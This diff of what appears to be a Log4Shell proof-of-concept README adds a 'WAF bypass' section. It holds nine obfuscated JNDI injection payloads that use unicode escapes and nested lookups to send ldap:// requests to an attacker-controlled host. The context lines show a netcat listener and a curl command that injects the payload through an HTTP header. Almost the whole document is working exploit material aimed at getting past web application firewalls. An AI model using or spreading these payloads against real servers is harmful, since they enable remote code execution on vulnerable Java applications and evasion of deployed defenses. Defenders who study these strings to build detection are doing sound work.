@@ -96,3 +96,31 @@ sudo nc -lvp 9999
 ```
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Exploit\}
 ```
+# WAF bypass
+```
+${\u006a\u006e\u0064\u0069:ldap://your-private-ip:1389/Exploit\}
+```
+```
+${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://your-private-ip:1389/Exploit\}
+```
+```
+${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://your-private-ip:1389/Exploit\}
+```
+```
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://your-private-ip:1389/Exploit\}
+```
+```
+${jnd${sys:SYS_NAME:-i}:ldap://your-private-ip:1389/Exploit\}
+```
+```
+${jnd${upper:ı}:ldap://your-private-ip:1389/Exploit\}
+```
+```
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://your-private-ip:1389/Exploit\}
+```
+```
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://your-private-ip:1389/Exploit\}
+```
+```
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//your-private-ip:1389/Exploit\}
+```
